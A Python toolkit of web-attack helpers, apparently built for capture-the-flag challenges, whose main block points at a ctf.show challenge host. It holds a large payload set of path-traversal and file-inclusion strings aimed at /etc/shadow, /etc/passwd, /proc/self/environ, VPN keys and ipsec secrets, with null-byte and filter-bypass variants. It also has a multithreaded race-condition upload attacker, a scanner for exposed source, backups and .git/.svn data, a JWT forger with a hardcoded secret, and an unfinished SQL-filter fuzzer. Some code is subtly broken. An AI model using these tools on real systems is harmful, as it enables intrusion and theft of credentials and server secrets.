import requests
import threading
from authlib.jose import jwt
import tqdm

PL_include = {'/etc/pure-ftpd/pure-ftpd.pdb', '/var/www/log/error_log',
              '../../../../../../../../../proc/self/environ%00', '/etc/ppp/options.xl2tpd.bak',
              '/etc/httpd/conf/httpd.conf', '/etc/httpd/conf/http.conf', '/var/www/html/',
              '../../../../../../proc/self/environ', '/var/log/apache/error.log', '/bin/php.ini',
              '../../../../../../etc/passwd', '/var/www/mgr/logs/access_log', '../../../../etc/group%00',
              '/etc/vsftpd/vsftpd.conf', '/www/php/php.ini', '/proc/self/exe', '/proc/sched_debug',
              '../../proc/self/environ%00', '/usr/local/cpanel/logs/login_log', '../../../../etc/security/passwd',
              '/lib/init/vars.sh', '/proc/self/fd/26', '../../etc/security/passwd',
              '../../../../../../../etc/security/passwd', '../../../../etc/security/group',
              '/var/log/apache2/error_log', '/www/htdocs/index.php',
              '../../../../../../../../../../../etc/security/group%00',
              '../../../../../../../../../../../../../../etc/group%00',
              '../../../../../../../../../../../etc/passwd%00', '/etc/issue', '/usr/local/cpanel/logs/stats_log',
              '/proc/self/fd/19', '/PHP/php.ini', '/tmp/sess_SESSIONID', '/etc/sysctl.conf.bak',
              '/etc/wu-ftpd/ftphosts', '../../../../../../../../../../../etc/group%00', '/proc/self/cwd',
              '/proc/self/fd/12', '/usr/local/Zend/etc/php.ini', '/proc/self/fd/13',
              '../../../../../../../../../../../etc/passwd', '../../../etc/security/user', '/etc/init.d/httpd',
              '/etc/openvpn/dh4096.pem', '/usr/local/httpd2.2/htdocs/index.html', '/etc/apache2/apache.conf',
              '/web/conf/php.ini', 'Files/Apache', '/etc/sysconfig/network', '/php4/php.ini', '/proc/self/net/route',
              '/etc/http/httpd.conf', '/etc/php4.4/fcgi/php.ini', '/etc/ppp/options.xl2tpd',
              '/var/log/pure-ftpd/pure-ftpd.log', '/opt/xampp/etc/php.ini', '/etc/openvpn/server.crtkey',
              '/NetServer/bin/stable/apache/php.ini', '/apache/apache/conf/httpd.conf',
              '/usr/local/etc/httpd/logs/access_log', '/etc/nginx/nginx.conf', '/usr/local/cpanel/logs/license_log',
              '/etc/ftphosts/etc/motd', '/usr/local/apache/htdocs/index.html',
              '../../../../../../../../etc/security/group%00', '....//....//....//....//etc/passwd%00',
              '/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php', '/usr/local/apache/htdocs/index.php',
              '/var/lib/mysql/my.cnf', '../../etc/security/group%00', '/usr/local/pureftpd/etc/pureftpd.pdb',
              '/proc/self/fd/27', '../../../../../../../../../../../../../etc/security/user%00)', '/proc/self/fd/1',
              '/var/log/error.log', '/var/apache/logs/access_log', '/var/log/exim/mainlog', '/etc/php.ini',
              '../../../../../../../etc/passwd%00', '/tmp/apache/htdocs/index.php',
              '../../../../../../../../../../../../../etc/shadow',
              '../../../../../../../../../../../../../etc/security/passwd%00', '/etc/httpd/logs/error.log',
              '/var/log/ftp-proxy', '../../../../../../../../../../proc/self/environ', '/proc/self/fd/14',
              '/apache2/logs/access.log', '../../../etc/security/group', '../../../../../etc/security/passwd',
              '/usr/local/etc/php.ini', '../../../../../../../../../../../../../etc/shadow%00', '/etc/rc.local',
              '/opt/xampp/logs/access_log', '../../../../../../../../../../../../../etc/passwd',
              '../../../../../etc/passwd%00', '/etc/security/user', '/usr/local/apps/apache2/conf/httpd.conf',
              '../../../../../proc/self/environ%00', '../../../../etc/shadow', '../../../../../../etc/security/passwd',
              '/etc/php/apache2/php.ini', '../../../../../../etc/security/user%00', '/etc/php/apache/php.ini',
              '/var/httpd/htdocs/index.php', '../../../../../etc/passwd', '/etc/openvpn/easy-rsa/keys/ta.key',
              '../../../../../../../../etc/passwd', '../../../etc/security/passwd%00', '/var/log/pureftpd.log',
              '/apache/logs/error.log', '../../../../../../../etc/shadow%00', '/usr/local/apache2/logs/error_log',
              '/usr/local/apache/httpd.conf', '/var/log/httpd/error_log', '../../../../../../etc/shadow%00',
              '/apache/php/php.ini', '../../../../../../../../../../../../../proc/self/environ',
              '/etc/logrotate.d/proftpd', '/etc/openvpn/easy-rsa/keys/client1.crt',
              '/usr/local/var/log/nginx/access.log', '../../../../../../etc/security/passwd%00', '/proc/self/fd/9',
              '/var/www/logs/access_log', '/etc/group', '/etc/openvpn/ca.crtcert', '/usr/local/php4/php.ini',
              '../etc/security/user', '/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php', '/proc/self/maps',
              '../../../../etc/group', '/usr/lib/php.ini', '/var/httpd/conf/httpd.conf', '/proc/self/environ',
              '/opt/nginx/logs/access.log', '/usr/sbin/pure-config.pl', '/proc/self/fd/7',
              '../../../../../../../../../../../../../../etc/passwd', '../../etc/shadow', '/proc/self/fd/17',
              '....//....//....//....//....//etc/passwd',
              '....//....//....//....//....//....//....//....//....//etc/passwd', '/logs/pure-ftpd.log', '/php/php.ini',
              '/var/www/index.html', '....//etc/passwd%00', '/usr/local/www/logs/thttpd_log', '/proc/self/fd/15',
              '../../../../../../../etc/security/user', '../../../../../etc/security/user%00',
              '../../../../../../../../../../../../../../../../etc/passwd%00', '/usr/local/etc/apache/conf/httpd.conf',
              '../../etc/passwd', '/var/log/error_log', '/etc/protpd/proftpd.conf', '/usr/local/apache2/logs/error.log',
              '/proc/self/fd/11', '../../../../../../../../../../../etc/security/user',
              '../../../../../../../../../../../etc/security/group', '/opt/lampp/logs/error.log',
              '/opt/apache2/conf/httpd.conf', '/var/log/mysql/mysql-slow.log', '../../../etc/passwd',
              '/etc/mysql/my.cnf', '/etc/httpd/php.ini', '/etc/php/php4/php.ini', '/var/log/access_log',
              '/etc/apache2/envvars', '../../../../../../../../../../../../../../etc/security/passwd%00',
              '/var/log/mysql/mysql-bin.log', '/etc/xl2tpd/xl2tpd.conf.bak',
              '../../../../../../../../../../../../etc/passwd', '/etc/openvpn/easy-rsa/keys/client1.key',
              '/etc/ld.so.conf', '../../etc/security/user%00', '/etc/ipsec.secrets', '/opt/www/conf/httpd.conf',
              '/proc/self/fd/16', '/usr/local/php5/httpd.conf.php', '/usr/local/apache/conf/httpd.conf',
              '/usr/local/mysql/bin/mysql', '../../../../../../../../../../etc/passwd%00', '/logs/error_log',
              '../../../../../../../../etc/security/user%00', '/etc/shadow', '/etc/php4/apache/php.ini',
              '../../../../../../../../../../../../../etc/security/user', '../../../../../../../proc/self/environ%00',
              '/usr/local/pureftpd/etc/pure-ftpd.conf', '../../../../../../../../../etc/security/passwd%00',
              '/usr/pkgsrc/net/pureftpd/', '/etc/host.conf', '/usr/local/apache2/conf/php.ini',
              '....//....//etc/passwd', 'Group/Apache/logs/access.log', '../../../../../../../../etc/security/passwd',
              '../../../../../../../../../etc/security/group', '../../../../etc/security/group%00',
              '/var/www/logs/error.log', '../../../../../../../../../../../etc/group',
              '/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini', '/etc/rc.d/rc.local',
              '../../../../../../../../../../etc/security/group', '/proc/verison',
              '../../../../../../../../../../../../etc/security/user%00',
              '../../../../../../../../../../../../etc/security/passwd', '../proc/self/environ%00', '/etc/pureftpd.pdb',
              '/var/local/www/conf/php.ini', '../../../../../../../../../../etc/security/passwd', '/proc/self/fd/24',
              '/proc/version', '/etc/vsftpd.conf', '/usr/local/etc/nginx/nginx.conf', '/etc/httpd/htdocs/index.html',
              '/www/conf/httpd.conf', '../../../../../../../../../etc/security/user', '/etc/shadowsocks/config.json',
              '/usr/local/apache/logs/error_logerror_log.old', '/proc/self/fd/2', '../../../../../../etc/passwd%00',
              '/www/logs/proftpd.system.log', '/tmp/apache/htdocs/index.html', '/usr/ports/contrib/pure-ftpd/',
              '../../../../../../../../../../../../../etc/group',
              '....//....//....//....//....//....//....//....//....//....//etc/passwd',
              '../../../../../../../../etc/passwd%00', '../../etc/group%00', '../../../../../../etc/security/user',
              '/etc/default/rcS', '/usr/local/httpd2.2/htdocs/index.php', '/var/www/mgr/logs/error_log',
              '/opt/www/htdocs/index.html', '/etc/ppp/pptpd-options',
              '/Volumes/webBackup/private/etc/httpd/httpd.conf.default', '/apache/logs/access.log',
              '....//....//....//....//....//....//....//....//....//etc/passwd%00', '/etc/motd',
              '/opt/xampp/logs/error_log', '/etc/httpd/logs/error_log', '../../../../../../../../../etc/shadow',
              '/etc/my.cnf', 'Group/Apache/logs/error.log', '../etc/shadow',
              '../../../../../../../etc/security/passwd%00', '/proc/self/fd/5', '../etc/security/passwd',
              '/www/php5/php.ini', '/etc/vsftpd.chroot_list', '/etc/phpmyadmin/config.inc.php',
              '../../../../../proc/self/environ', '../../../../etc/shadow%00', '/proc/self/fd/18',
              '/usr/local/nginx/conf/nginx.conf', '/etc/logrotate.d/vsftpd.log',
              '../../../../../../../../../../../../etc/security/user', '/var/log/exim/rejectlog',
              '/usr/local/app/apache2/conf/http.conf', '#',
              '../../../../../../../../../../../../../proc/self/environ%00', '/usr/apache2/conf/httpd.conf',
              '../../../../../../../../../etc/group', '/usr/local/php/lib/php.ini', '/etc/sysctl.conf',
              '../../../../../../../../etc/shadow%00', '/etc/proftp.conf', '/logs/access.log', '/etc/fstab',
              '/usr/local/apache/log', '/var/log/apache2/access_log',
              '../../../../../../../../../../../../etc/shadow%00', '/var/www/conf/httpd.conf',
              '....//....//....//....//....//....//etc/passwd', '/proc/net/tcp', '/proc/self/fd/23',
              '/etc/httpd/conf.d/httpd.conf',
              '....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
              '/Volumes/webBackup/opt/apache2/conf/httpd.conf', '/etc/httpd/conf.d/php.conf', '/etc/httpd.conf',
              '../../etc/security/user', '....//....//....//etc/passwd%00',
              '../../../../../../../../../../../../proc/self/environ', '/var/log/mysql/mysql.log',
              '/var/log/apache-ssl/access.log', '/www/htdocs/index.html', '/usr/local/lib/php.ini',
              '/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf',
              '....//....//....//....//....//....//....//etc/passwd%00', '../../../proc/self/environ',
              '/etc/wu-ftpd/ftpusers', '../../../../../etc/security/group%00', '/proc/self/fd/32',
              '../../../../../../../../proc/self/environ%00', '../../../../../../etc/security/group',
              '../../../../../../../../../../etc/group', '/var/www/logs/access.log', '/var/log/nginx/error.log',
              '/usr/local/var/log/nginx/error.log', '/etc/httpd/logs/access_log',
              '../../../../../../../../../proc/self/environ', '/logs/access_log', '/var/log/exim_mainlog',
              '/var/mysql.log', '/opt/lampp/logs/access_log', '/proc/self/fd/4', '/proc/mounts',
              '/etc/vhcs2/proftpd/proftpd.conf', '/etc/logrotate.d/ftp',
              '../../../../../../../../../../../../etc/security/passwd%00', '/etc/php5/cgi/php.ini',
              '../../../../../../../../../../etc/shadow', '/usr/local/nginx/logs/access.log',
              '../../../../../../../../../../../../../etc/group%00', '/var/www/mgr/logs/error.log',
              '/etc/pure-ftpd/pureftpd.pdb', '../../../../../../../../../../../proc/self/environ%00',
              '/usr/local/php5/php5.ini', '/usr/local/etc/pure-ftpd.conf', '../../../../proc/self/environ%00',
              '/usr/local/apache2/logs/access_log', '../../../../../../../../../../../../../../../../etc/passwd',
              '../../../../../../../../../etc/group%00', '/usr/local/etc/apache2/httpd.conf', '/etc/init.d/mysql',
              '/etc/openvpn/easy-rsa/2.0/keys/server.keydh', '/usr/local/etc/httpd/logs/error_log',
              '../../etc/shadow%00', '/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf', '/var/log/httpd/accesslog',
              '/var/log/apache/error_log', '../../../../../../../../../../etc/security/group%00',
              '/etc/php5/fpm/php-fpm.conf', '/usr/local/php4/lib/php.ini', '/etc/security/group', '/etc/ipsec.conf',
              '../../../../../../../../../etc/shadow%00', '/usr/local/etc/httpd/conf/httpd.conf',
              '/etc/apache2/conf/httpd.conf', '/usr/local/apache/logs/access.log', '/proc/self/fd/8',
              '../../../../../etc/group', '/opt/apache/conf/httpd.conf', '../../etc/security/passwd%00',
              '/usr/apache/conf/httpd.conf', '/etc/chrootUsers', '/usr/local/php5/lib/php.ini',
              '/Volumes/webBackup/private/etc/httpd/httpd.conf', '/var/log/nginx/access.log', '/var/log/maillog',
              '/etc/apache/conf/httpd.conf', '/var/log/access.log', '/home/apache2/conf/httpd.conf',
              '/usr/local/apache/conf/php.ini', '/var/www/htdocs/index.php', '/usr/lib/security/mkuser.default',
              '/usr/local/php4/httpd.conf.php', '../../../etc/group', '/var/httpd/conf/php.ini',
              '/usr/local/apache/logs/access_log', '/etc/httpd/logs/access.log', '/etc/openvpn/server.keydh',
              '/var/log/mysql.log', '../../../../../../../../etc/security/group', '../../../../etc/security/user',
              '../../../../../../../../../../etc/security/passwd%00', '....//....//....//....//etc/passwd',
              '/etc/ppp/peers/hcoffice', '/etc/openvpncd', '../../etc/group', '/proc/self/fd/25',
              '/etc/php5/apache/php.ini', '/etc/httpd/logs/acces.log', '../../../../../../../etc/security/group',
              '/usr/local/etc/apache/vhosts.conf', '/etc/httpd/logs/acces_log', '/usr/local/cpanel/logs/access_log',
              '../../../../../../../../../../etc/group%00', '../../../etc/passwd%00',
              '../../../../../../../../etc/security/user', '/etc/wu-ftpd/ftpaccess', '/proc/self/fd/33',
              '/var/log/thttpd_log', '/proc/self/fd/28', '/usr/local/cpanel/logs',
              '....//....//....//....//....//....//etc/passwd%00',
              '....//....//....//....//....//....//....//....//etc/passwd', '/etc/my.cnfmysql',
              '/etc/pure-ftpd/pure-ftpd.conf', '../../../../../../../../../../../etc/security/passwd',
              '../../../../../../etc/group%00', '/proc/self/fd/21', '/etc/pureftpd.passwd', '/etc/shadowsocks.json',
              '../../../../../../../../../../../../proc/self/environ%00', '/etc/security/environ',
              '../../etc/passwd%00', '../../../../../etc/group%00', '/var/www/mgr/logs/access.log', '/proc/self/fd/6',
              '../../../../../../../etc/passwd', '../../../../../../../etc/group', '/var/log/apache/access_log',
              '/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf', '/usr/local/php/httpd.conf.php',
              '../../../../../../../../../../../../../etc/security/passwd',
              '/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php', '/etc/apache/httpd.conf',
              '../../etc/security/group', '/etc/apache2/sites-available/default', '/etc/php/cgi/php.ini',
              '....//....//etc/passwd%00', '/etc/php4/apache2/php.ini', '/proc/self/fd/3',
              '/etc/apache2/mods-available/dir.conf', '/etc/openvpn/easy-rsa/2.0/keys/dh1024.pem',
              '../../../../../../../../../../../../../../etc/shadow%00', 'config', '/etc/php5/fpm/pool.d/www.conf',
              '/usr/local/share/examples/php4/php.ini', '../../../../../../../../../../../etc/security/user%00',
              '/logs/error.log', '/proc/self/fd/30', '/usr/local/apache/logs/access_logaccess_log.old',
              '../../../etc/security/group%00', '../../../../../../../proc/self/environ',
              '....//....//....//....//....//....//....//etc/passwd', '/etc/proftpd/modules.conf',
              '../../../../../../../../../etc/security/user%00', '/etc/httpd/htdocs/index.php', '../../../etc/group%00',
              '/opt/www/htdocs/index.php', '/proc/self/status', '/var/log/apache2/error.log',
              '../../../../../../../../../../../etc/security/passwd%00',
              '....//....//....//....//....//....//....//....//etc/passwd%00', '/opt/lampp/logs/error_log',
              '/var/apache/logs/error_log', '/xampp/apache/conf/httpd.conf', '/usr/local/php5/etc/php.ini',
              '/etc/hosts', '/etc/resolv.conf', '/var/log/httpsd/ssl_log',
              '../../../../../../../../../../../../../../etc/group', '../../../../../../../../../../etc/shadow%00',
              '/etc/ppp/ip-up.d/hcoffice', '/proc/cmdline', '../../../../../etc/shadow%00', '/opt/xampp/logs/error.log',
              '/etc/ftpchroot', '/proc/self/fd/10', '/etc/http/conf/httpd.conf',
              '/private/etc/httpd/httpd.conf.default', '/etc/openvpn/easy-rsa/2.0/keys/server.crtkey',
              '/usr/local/pureftpd/sbin/pure-config.pl', '/usr/pkg/etc/httpd/httpd.conf',
              '../../../../../../../../../etc/security/passwd', '../../../../../../../etc/security/user%00',
              '/proc/self/fd/22', '/proc/net/udp', '../etc/group%00', '/proc/net/arp', '/etc/passwd',
              '/usr/local/share/examples/php/php.ini', '../../../../../../../../../../../../../../proc/self/environ',
              '/etc/ppp/chap-secrets', '/home/apache/conf/httpd.conf', '/usr/local/cpanel/logs/error_log', 'VPN',
              '/etc/openvpn/easy-rsa/vars', '/usr/etc/pure-ftpd.conf', '/etc/openvpn/easy-rsa/keys/ca.crt',
              '../../../../../../../../../../proc/self/environ%00', '/usr/local/apache/logs',
              '../../../../../../../../../etc/passwd%00', '../../../etc/security/user%00',
              '../../../../../../../../etc/group%00', '/etc/security/limits', '/proc/self/fd/29',
              '../../../../../../../../../../../../etc/passwd%00', '../../../../../../etc/security/group%00',
              '/usr/local/apache2/htdocs/index.html', '../../../../../etc/shadow',
              '../../../../../../../../../../../../../../etc/shadow', '/var/adm/log/xferlog',
              '/usr/local/app/php5/lib/php.ini', '/etc/security/passwd', '/etc/php4/cgi/php.ini',
              '/usr/local/apache/logs/error.log', '/var/log/exim_rejectlog', '/opt/lampp/logs/access.log',
              '/proc/self/stat', '../etc/security/group%00', '../../../../../../../../../../../../etc/group%00',
              '../etc/shadow%00', '/proc/self/fd/35', '/var/local/www/conf/httpd.conf',
              '../../../../../../../etc/shadow', '../../../../etc/passwd', '/etc/pptpd.conf',
              '/usr/local/apache2/httpd.conf', '../../../etc/security/passwd',
              '../../../../../../../../../../etc/security/user', '/usr/local/etc/apache22/httpd.conf',
              '/usr/local/apache2/htdocs/index.php', '/php5/php.ini', '/var/log/apache2/access.log',
              '../../../../proc/self/environ', '../../../../etc/security/passwd%00', '/etc/nginx/conf.d/default.conf',
              '../../../../../etc/security/user', 'proc/self/stat', '/proc/net/route', '/opt/xampp/logs/access.log',
              '/proc/net/fib_trie', '../../../../etc/passwd%00', '/var/cpanel/cpanel.config', '../../../etc/shadow',
              '/proc/self/fd/20', '/proc/self/cmdline', '../etc/security/user%00',
              '/var/log/ftplog/var/log/httpd/access_log', '/var/www/logs/error_log', '../../proc/self/environ',
              '../etc/security/passwd%00', '../../../../../etc/security/group', '/usr/ports/net/pure-ftpd/',
              '../../../../../../../../../../etc/passwd', '/var/log/apache-ssl/error.log',
              '../../../../../../../../../../../../etc/group', '../../../../../../../../proc/self/environ',
              '....//....//....//....//....//etc/passwd%00', '/etc/hostname', '/var/log/ftp-proxy/ftp-proxy.log',
              '/var/httpd/htdocs/index.html', '../../../../../../../../../../../../../etc/passwd%00',
              '../../../../../../etc/shadow', '/var/log/apache/access.log', '../../../../../../../../etc/shadow',
              '/usr/local/etc/apache/httpd.conf', '/etc/openvpn/server.conf', '/proc/self/fd/0',
              '../../../etc/shadow%00', '../../../../../../../../etc/security/passwd%00', '/var/www/htdocs/index.html',
              '../../../../../../../../etc/group', '../../../../../../../../../../../../../../etc/security/passwd',
              '../../../../../../../../../../etc/security/user%00', '../../../../../../../etc/security/group%00',
              '/proc/self/fd/31', '/var/log/proftpd/var/www/logs/access.log', '/var/log/vsftpd.log',
              '/usr/lib/php/php.ini', '/usr/local/apache2/conf/httpd.conf', '/var/log/xferlog', '../etc/passwd',
              '/etc/openvpn/easy-rsa/2.0/keys/ca.crtcert', '/var/log/exim/paniclog', '/usr/local/etc/pureftpd.pdb',
              '/etc/php5/apache2/php.ini', '/etc/apache2/apache2.conf', '/etc/apache2/vhosts.d/00_default_vhost.conf',
              '/usr/local/apache/logs/error_log', '/etc/apache/apache.conf', '/www/php4/php.ini',
              '../../../../../../../../../../../proc/self/environ', '....//etc/passwd', '/etc/php/php.ini',
              '/etc/init.d/openvpn', '../../../../../../../../../../../../../../proc/self/environ%00',
              '../../../../../../proc/self/environ%00', '/etc/apache2/httpd.conf', '/var/www/log/access_log',
              '../../../../../../etc/group', '../etc/group', '/xampp/apache/bin/php.ini',
              '/apache/apache2/conf/httpd.conf', '/Program', '../../../../../../../../../etc/passwd',
              '/var/log/httpsd/ssl.access_log', '../../../../etc/security/user%00', '/etc/xl2tpd/xl2tpd.conf',
              '/usr/local/apps/apache/conf/httpd.conf', '/apache2/logs/error.log', '/usr/local/php/httpd.conf',
              '/etc/pure-ftpd.conf', '/usr/local/mysql/my.cnf',
              '../../../../../../../../../../../../../../etc/passwd%00', '../../../../../../../../../../../etc/shadow',
              '/etc/httpd/httpd.conf', '/var/log/exim_paniclog', '/home2/bin/stable/apache/php.ini',
              '/usr/local/httpd/conf/httpd.conf', '/etc/crontab', '/var/www/index.php',
              '/etc/openvpn/easy-rsa/keys/client.ovpn', '/usr/local/apache2/logs/access.log',
              '....//....//....//etc/passwd', '/home/bin/stable/apache/php.ini', '/private/etc/httpd/httpd.conf',
              '../../../proc/self/environ%00', '../../../../../../../../../etc/security/group%00',
              '/usr/local/php4/httpd.conf', '/proc/self/net/arp', '/usr/local/php5/httpd.conf',
              '../../../../../../../../../../../../etc/shadow', '../../../../../../../etc/group%00', '/etc/inetd.conf',
              '/usr/local/etc/apache2/conf/httpd.conf', '../../../../../etc/security/passwd%00',
              '../../../../../../../../../../../etc/shadow%00', '/proc/self/fd/34', '../etc/security/group',
              '/var/log/mysqlderror.log'}


# 竞争上传
class RaceUpload(threading.Thread):
    @staticmethod
    def go(url, upurl, fn, pararn='file'):
        threads = 20
        for i in range(threads):
            t = RaceUpload(url, upurl, fn, pararn)
            t.start()
        for i in range(threads):
            t.join()

    def __init__(self, url, upurl, fn, paran):
        threading.Thread.__init__(self)
        self.fn = fn
        self.url = url
        self.uploadUrl = upurl
        self.paran = paran

    def _get(self):
        r = requests.get(self.url)
        if r.status_code == 200:
            print("[*]RaceUpload success")
            return

    def _upload(self):
        file = {self.paran: open(self.fn, "rb"), }
        requests.post(self.uploadUrl, files=file)

    def run(self):
        while True:
            for i in range(5):
                self._get()
            for i in range(10):
                self._upload()
                self._get()


# 源码测试

def GetSCode(urlroot='', fileh='', filet='', head='', addurl=[]):
    hed = 'tmp dir backup test.php upload.php t.php login.php register register.php phpinfo.php .index.php index.php flag.php source config.php web root website %3f .%3f source.php user.php .source.php backup back www wwwroot temp .index.php index config dir' + fileh
    tls = '.phps .php .txt .vim .swp  .~ .7z .bak .phpc .tar .tar.gz  .zip .rar ' + filet

    add = ['.git', '.git/HEAD', '.git/index', '.git/config', '.git/description', '.idea/workspace.xml', 'README.MD',
           'README.md', 'README', '.gitignore', '.svn', '.svn/wc.db', '.svn/entries', '.hg', '.DS_store',
           'WEB-INF/web.xml',
           'WEB-INF/src/', 'WEB-INF/classes', 'WEB-INF/lib', 'WEB-INF/database.propertie', 'CVS/Root', 'CVS/Entries',
           '.bzr/',
           '_viminfo', '.viminfo', '%3f~', '%3f~1~', '%3f~2~', '%3f~3~', '%3f.save', '%3f.save1', '%3f.save2',
           '%3f.save3',
           '%3f.bak_Edietplus', '%3f.bak', '%3f.back', 'robots.txt', '.htaccess', '.bash_history', '.svn/', '.git/',
           '.swp',
           'plus', 'qq.txt', 'log.txt', 'web.rar', 'dede', 'admin', 'edit', 'Fckeditor', 'ewebeditor', 'bbs', 'Editor',
           'manage', 'shopadmin', 'web_Fckeditor', 'login', 'flag', 'webadmin', 'admin/WebEditor',
           'admin/daili/webedit',
           'login/', 'database/', 'tmp/', 'manager/', 'manage/', 'web/', 'admin/', 'shopadmin/', 'wp-includes/',
           'edit/',
           'editor/', 'user/', 'users/', 'admin/', 'home/', 'test/', 'administrator/', 'houtai/', 'backdoor/', 'flag/',
           'upload/', 'uploads/', 'download/', 'downloads/', 'manager/', '.svn/entries', '.ds_store', 'flag.php ',
           'fl4g.php',
           'f1ag.php', 'f14g.php', 'admin.php', '4dmin.php', 'adm1n.php', '4dm1n.php', 'admin1.php', 'admin2.php',
           'adminlogin.php', 'administrator.php', 'login.php', 'register.php', 'upload.php', 'home.php', 'log.php',
           'logs.php', 'config.php', 'member.php', 'user.php', 'users.php', 'robots.php', 'info.php', 'phpinfo.php',
           'backdoor.php', 'fm.php', 'example.php', 'mysql.bak', 'a.sql', 'b.sql', 'db.sql', 'bdb.sql', 'ddb.sql',
           'users.sql', 'mysql.sql', 'dump.sql', 'data.sql', 'rss.xml', 'crossdomain.xml', '1.txt', 'flag.txt',
           '/wp-config.php', '/configuration.php', '/sites/default/settings.php', '/config.php', '/config.inc.php',
           '/conf/_basic_config.php', '/config/site.php', '/system/config/default.php', '/framework/conf/config.php',
           '/mysite/_config.php', '/typo3conf/localconf.php', '/config/config_global.php', '/config/config_ucenter.php',
           '/lib', '/data/config.php', '/data/config.inc.php', '/includes/config.php', '/data/common.inc.php',
           '/caches/configs/database.php', '/caches/configs/system.php', '/include/config.inc.php',
           '/phpsso_server/caches/configs/database.php', '/phpsso_server/caches/configs/system.php', '404.php', 'user/',
           'users/', 'admin/', 'home/', 'test/', 'administrator/', 'houtai/', 'backdoor/', 'flag/', 'uploads/',
           'download/',
           'downloads/', 'manager/', 'phpmyadmin/', 'phpMyAdmin/']

    if not head == '': hed = head
    add.extend(addurl)
    for i in range(4):
        hed = hed.replace('  ', ' ')
        tls = tls.replace('  ', ' ')

    hl = [x.replace(' ', '') for x in hed.split(' ')]
    tl = [x.replace(' ', '') for x in tls.split(' ')]

    if not urlroot.startswith('http'):
        urlroot = 'http://' + urlroot
    if not urlroot.endswith('/'):
        urlroot += '/'
    print('urlroot:', urlroot)
    ret = {}
    for i in tqdm.tqdm(hl):
        for t in tl:
            try:
                file = i + t
                resp = requests.get(urlroot + file)
                req = '%d, %s' % (resp.status_code, len(resp.text))
                if req in ret:
                    ret[req] += file + ', '
                else:
                    ret[req] = file + ', '
            except:
                pass
    for i in tqdm.tqdm(add):
        try:
            resp = requests.get(urlroot + i)
            req = '%d, %s' % (resp.status_code, len(resp.text))
            if req in ret:
                ret[req] += i + ', '
            else:
                ret[req] = i + ', '
        except:
            pass
    print()
    for i in sorted(ret, reverse=True):
        if i.startswith('4'):
            ph = '\033[0;31m[-]'
        elif i.startswith('3'):
            ph = '\033[0;33m[-]'
        else:
            ph = '\033[0;32m[+]'
        print(ph + '%-15s=>[%s]' % (i, ret[i]))

    return ret


def jwtCreater(pl='', secret='xRt*YMDqyCCxYxi9a@LgcGpnmM2X8i&6', header={"alg": "HS256", "typ": "JWT"}) -> str:
    return jwt.encode(header, pl, secret).decode('utf-8')


class tututu:
    url = ''
    req = requests
    encodeing = 'gbk'

    @staticmethod
    def insert_pie(txt=''):
        ret = ''
        for i in txt:
            ret += i
            ret += "''"

    def donothon(txt):
        return txt

    def __init__(self, url=''):
        self.url = url
        self.req = requests
        self.func = tututu.donothon

    def tutug(self, func=None):
        while True:
            pl = input("pl>")
            pl = self.func(pl)
            res = self.req.get(self.url + pl)
            res.encoding = self.encodeing
            o = res.text
            if not (func == None):
                o = func(res)
            print(o)
            print(pl)
            print(' - ' * 30)


class fuzzX:  # 未完成，waf千千万，实在难搞定啊
    sqlword = ['substr', 'hex', 'bin', 'conv', 'union', 'form', 'if', 'sleep', '/*', '/!', '--', '<>', 'and', 'or',
               'xor', 'delay', 'print', 'insert', 'select',
               'delete', 'updata', 'dis', 'length', 'right', 'left', 'mid', 'handler', 'having', 'replace', 'like',
               'join', 'as', 'limit', 'ord', 'ascii', 'char',
               'group_conca']
    sqlGJZ = [chr(i) for i in range(1, 127)].extend(sqlword)

    @staticmethod
    def chkget(url='', pl=sqlGJZ, func=lambda x, y: x in y):
        ret = []
        for i in tqdm.tqdm(fuzzX.sqlGJZ):
            txt = requests.get(url.format(i)).text
            if not func(pl, txt):
                ret.append(i)  # 我只关心失败的
        print(ret)
        return ret;

    @staticmethod
    def chkpost(url='', pl=sqlGJZ, dat={'a': '{}'}, key='a', func=lambda x, y: x in y):
        ret = []
        for i in tqdm.tqdm(fuzzX.sqlGJZ):
            dat[key].format(pl)
            txt = requests.post(url, data=dat).text
            if not func(pl, txt):
                ret.append(i)  # 我只关心失败的
        print(ret)
        return ret;


if __name__ == "__main__":
    GetSCode('https://ec54ec56-7a80-4677-af11-ceb7b8b26af1.chall.ctf.show')
    pass
